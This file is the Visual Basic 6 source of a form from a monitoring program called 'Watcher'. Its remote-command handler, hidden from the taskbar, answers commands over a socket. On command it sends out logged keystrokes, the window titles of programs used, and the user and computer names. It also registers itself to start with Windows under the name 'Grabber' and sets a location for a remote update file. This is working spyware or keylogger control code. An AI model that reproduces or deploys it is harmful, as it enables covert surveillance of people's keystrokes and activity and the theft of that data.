VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Form1"
   ClientHeight    =   450
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   1380
   Icon            =   "Spy.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   450
   ScaleWidth      =   1380
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   900
      Top             =   15
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   450
      Top             =   15
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   15
      _ExtentX        =   741
      _ExtentY        =   741
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ReDirection As Integer

Private Sub Form_Click()
    Cls
    Print GetActiveWindowTitle(False)
    Print GetUserName
    Print GetComputerName
    Print GetExe(GetActiveWindow(False))
End Sub

Private Sub Timer1_Timer()
    Timer1.Enabled = False
    DoNotWait = False
    ReDirection = 0
End Sub

Private Sub Timer2_Timer()
   Winsock1.SendData Me.Tag
   Timer2.Enabled = False
End Sub

Public Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim txt As String
    If Winsock1.State <> 1 Then Exit Sub
    Timer1.Enabled = False
    Winsock1.GetData txt
    If txt = "" Then Exit Sub
    Debug.Print txt
    DoNotWait = True
    If Err > 0 Then SendDebug Error, 3
    If ReDirection = 0 Then
      Select Case LCase(txt)
          Case "ping"
              Send "pong"
          
          Case "hello"
              Timer1.Enabled = False
              Send "Hello"
              Timer1.Enabled = True
              DoNotWait = True
          
          Case "startsendconfig"
              Send "SendConfigStarted"
              DoNotWait = True
              ReDirection = 1
              
          Case "mainconfig"
              DoNotWait = True
              ReDirection = 2
              Send "MainConfigEnabled"
          
          Case "pos"
              Send "You are in Main."
          
          Case "help"
              Send "VALID COMMANDS FOR MAIN PROCEDURE ARE"
              Send "Hello StartSendConfig MainConfig Pos Help"
           
          Case Else
              Send "Sorry i don't recognize command " & txt
              Send "Type 'HELP' for help"
      End Select
      Exit Sub
    End If
    If ReDirection = 1 Then SendSub txt: Exit Sub
    If ReDirection = 2 Then MainCfg txt: Exit Sub
    If Err > 0 Then SendDebug Error, 3
End Sub

Private Sub SendSub(txt As String)
    Static Level As Integer, rec As Recordset, key As Recordset
    Static Date1 As Date, Date2 As Date, sendtxt As String
    Dim leto As Integer, mesc As Integer, dan As Integer
    
    On Error GoTo napaka
    If InStr(1, txt, ":") > 0 Then
        stxt = Mid(txt, 1, InStr(1, txt, ":") - 1)
    Else
        stxt = txt
    End If
    If Err > 0 Then SendDebug Error, 3
    Select Case LCase(stxt)
        Case "hello"
            ReDirection = 0
            Timer1.Enabled = False
            Send "Hello"

        Case "today"
            If Level = 0 Then
                Set rec = Baza.OpenRecordset("SELECT * FROM Podatki WHERE Datum = cvdate('" & Date & "') ORDER BY ProgramName")
                Set key = Baza.OpenRecordset("SELECT * FROM tipke WHERE Datum > cvdate('" & Date & "') AND Datum < cvdate('" & DateAdd("d", 1, Date) & "') ORDER BY Datum")
                Send "DataReady"
            End If
        
        Case "datefrom"
            leto = Mid(txt, 11, 4)
            mesc = Mid(txt, 16, 2)
            dan = Mid(txt, 19)
            Date1 = DateSerial(leto, mesc, dan)
            Send "DateTo?"
            
        Case "dateto"
            leto = Mid(txt, 9, 4)
            mesc = Mid(txt, 14, 2)
            dan = Mid(txt, 17)
            Date2 = Trim(Mid(txt, 8))
            Set rec = Baza.OpenRecordset("SELECT * FROM Podatki WHERE Datum > cvdate('" & DateAdd("d", -1, Date1) & "') AND Datum < cvdate('" & DateAdd("d", 1, Date2) & "') ORDER BY Datum, ProgramName")
            Set key = Baza.OpenRecordset("SELECT * FROM Tipke WHERE Datum > cvdate('" & DateAdd("d", 0, Date1) & "') AND Datum < cvdate('" & DateAdd("d", 1, Date2) & "') ORDER BY Datum")
            Send "DataReady"
        
        Case "startsend"
            If rec.EOF Then
                If key.EOF Then
                    DoNotWait = False
                    ReDirection = 0
                    Send "Done"
                    Timer1.Enabled = False
                Else
                    sendtxt = "Keys Word1:" & key!keyState & ":Word2:" & key!Datum & ":Word3:" & key!duration & ":"
                    Send sendtxt
                End If
            Else
                sendtxt = "Prog Word1:" & rec!ProgramName & ":Word2:" & rec!ProgramTitle & ":Word3:" & rec!Datum & ":Word4:" & rec!duration & ":"
                Send sendtxt
            End If
        Case "next"
            
            If rec.EOF Then
                If key.EOF Then
                    DoNotWait = False
                    ReDirection = 0
                    Send "Done"
                    Timer1.Enabled = False
                Else
                    key.MoveNext
                    If key.EOF Then
                        DoNotWait = False
                        ReDirection = 0
                        Send "Done"
                        Timer1.Enabled = False
                    Else
                        sendtxt = "Keys Word1:" & key!keyState & ":Word2:" & key!Datum & ":Word3:" & key!duration & ":"
                        Send sendtxt
                    End If
                End If
            Else
                rec.MoveNext
                If rec.EOF = False Then
                    sendtxt = "Prog Word1:" & rec!ProgramName & ":Word2:" & rec!ProgramTitle & ":Word3:" & rec!Datum & ":Word4:" & rec!duration & ":"
                    Send sendtxt
                Else
                    If key.EOF Then
                        DoNotWait = False
                        ReDirection = 0
                        Send "Done"
                        Timer1.Enabled = False
                    Else
                        sendtxt = "Keys Word1:" & key!keyState & ":Word2:" & key!Datum & ":Word3:" & key!duration & ":"
                        Send sendtxt
                    End If
                End If
            End If
        
        Case "end"
            DoNotWait = False
            ReDirection = 0
            Send "Done"
        
        Case "pos"
            Send "You are in SendSub."
        
        Case "stoptimer"
            Timer1.Enabled = False
            Send "Timer Enabled = " & Timer1.Enabled
        
        Case "help"
            Send "VALID COMMANDS FOR SEND PROCEDURE ARE"
            Send "Today DateFrom: DateTo: StartSend Next"
            Send "End Pos StopTimer Help"
        
        Case Else
            Send "Sorry i don't recognize command " & stxt
            Send "Type 'HELP' for help"
            
    End Select
    If Err > 0 Then SendDebug Error, 3
   Exit Sub

napaka:
   SendDebug Error, 3
End Sub

Sub MainCfg(txt As String)
   On Error Resume Next
   Dim rec As Recordset
   Timer1.Enabled = False
   If InStr(1, txt, " ") > 0 Then
        stxt = Mid(txt, 1, InStr(1, txt, " ") - 1)
    Else
        stxt = txt
    End If
   If Err > 0 Then SendDebug Error, 3
   
   Select Case LCase(stxt)
      Case "ports"
         If Trim(Mid(txt, Len(stxt) + 1)) = "" Then
            Send "Ports: " & Winsock1.LocalPort & "/" & Winsock1.RemotePort
         Else
            Send "See you there."
         End If
      Case "warn"
         Send "Sorry this function is not supported by this version of Watcher"
         
      Case "os"
        If Win32 = True Then
            Send "This computer is running on Win9x operating system."
        Else
            Send "This computer is running on WinNT operating system."
        End If
        
      Case "selftest"
         X = DebugLevel
         DebugLevel = 10
         On Error Resume Next
         Send "Preforming SelfTest"
         Send "    App Path = " & App.Path
         dd = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Grabber")
         Send "    Registered = " & IIf(dd <> "", "OK", "False")
         dd = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "NewVersion")
         Send "    Expected upgrade = " & IIf(dd <> "", "OK", "False")
         Send "    Database Name = " & Baza.Name
         Set rec = Baza.OpenRecordset("SELECT COUNT(*) FROM Podatki")
         Send "    Podatki RecordCount = " & rec.Fields(0).Value
         Set rec = Baza.OpenRecordset("SELECT COUNT(*) FROM Tipke")
         Send "    Tipke RecordCount = " & rec.Fields(0).Value
         If Err > 0 Then Send "WARNING: SelfTest FAILD "
         Send "End of SelfTest"
         DebugLevel = X
      Case "hello"
         ReDirection = 0
         Send "Hello"
         
      Case "ver"
         Send "My version is: " & App.Major & "." & App.Minor & "." & App.Revision
      
      Case "newfile"
         If Trim(Mid(txt, Len(stxt) + 1)) = "" Then
            dd = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "NewVersion")
            Send "New File is expected at " & dd
         Else
            SaveString HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "NewVersion", Trim(Mid(txt, Len(stxt) + 1))
            Send "New File Location is set to " & Trim(Mid(txt, Len(stxt) + 1))
         End If
         
      Case "end"
         DoNotWait = False
         ReDirection = 0
         Send "Done"
         Timer1.Enabled = True
      
      Case "pos"
         Send "You are in MainConfig."
   
      Case "reboot"
         Send "Switching in RunLevel 6"
         RunLevel = 6
      
      Case "debuglevel"
         If Trim(Mid(txt, Len("debuglevel "))) = "" Then
            Send "Debug level = " & DebugLevel
         Else
            Send "Switching into debug level " & Trim(Mid(txt, Len("debuglevel ")))
            If IsNumeric(Trim(Mid(txt, Len("debuglevel ")))) Then
               DebugLevel = Trim(Mid(txt, Len("debuglevel ")))
               Send "OK"
            Else
               Send "FAILD"
            End If
         End If
      
      Case "runlevel"
         Send "RunLevel = " & RunLevel
      
      Case "keepdata"
         If Trim(Mid(txt, Len("keepdata "))) = "" Then
            dd = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "ExDate")
            Send "Store Data For " & dd
         Else
            If IsNumeric(Trim(Mid(txt, Len("keepdata ")))) Then
               SaveString HKEY_LOCAL_MACHINE, "SOFTWARE\SoftTech-si\Watcher", "ExDate", Trim(Mid(txt, Len("keepdata ")))
               Send "OK"
            Else
               Send "FAILD"
            End If
         End If
      
      Case "msg"
         If Trim(Mid(txt, 5)) <> "" Then
            Send "Showing msg"
            MsgBox Mid(txt, 5), vbExclamation, "Watcher"
            Send "Msg was readed"
         End If
      
      Case "halt"
         Send "Switching into runlevel 0"
         RunLevel = 0
      
      Case "ehalt"
         Send "BYE"
         End
            
      Case "setservice"
         SaveString HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Grabber", App.Path & "\" & App.EXEName & ".exe"
         Send "Done"
      
      Case "removeservice"
         DeleteSetting HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Grabber"
         Send "Done"
      
      Case "computername"
         Send GetComputerName
      
      Case "username"
         Send GetUserName
      
      Case "help"
         Send "Valid commands are:"
         Send "End, Reboot, DebugLevel,KeepData, ComputerName"
         Send "UserName, Msg, Halt, EHalt, SetService, RemoveService, NewFile"
         Send "OS, Ver, SelfTest"
      
      Case Else
         Send "Sorry i don't recognize command " & stxt
         Send "Type 'HELP' for help"

   End Select
   If Err > 0 Then SendDebug Error, 3
End Sub
